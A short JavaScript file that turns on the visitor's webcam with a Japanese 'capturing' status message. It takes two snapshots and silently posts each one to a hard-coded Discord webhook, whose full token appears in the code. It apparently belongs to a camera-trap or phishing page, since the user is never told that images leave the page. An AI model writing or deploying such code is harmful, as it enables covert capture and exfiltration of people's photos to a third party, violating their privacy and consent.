
async function startCamera() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';
        status.textContent = "撮影中...";

        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => sendToDiscord(blob), 'image/jpeg');

            setTimeout(() => {
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(blob => sendToDiscord(blob), 'image/jpeg');
                status.textContent = "ありがとうございました！";
            }, 1000);
        }, 2000);
    } catch (err) {
        alert("カメラの起動に失敗しました：" + err.message);
    }
}

function sendToDiscord(blob) {
    const webhookUrl = "https://discordapp.com/api/webhooks/1366733661457747989/4B7h-9zJltiz2BH__TSKcBK6y862iK3ym7nu3Exi0OvQveJe4cPYEWt5A6clkGUIRxmq";
    const formData = new FormData();
    formData.append("file", blob, "photo.jpg");
    fetch(webhookUrl, { method: "POST", body: formData });
}
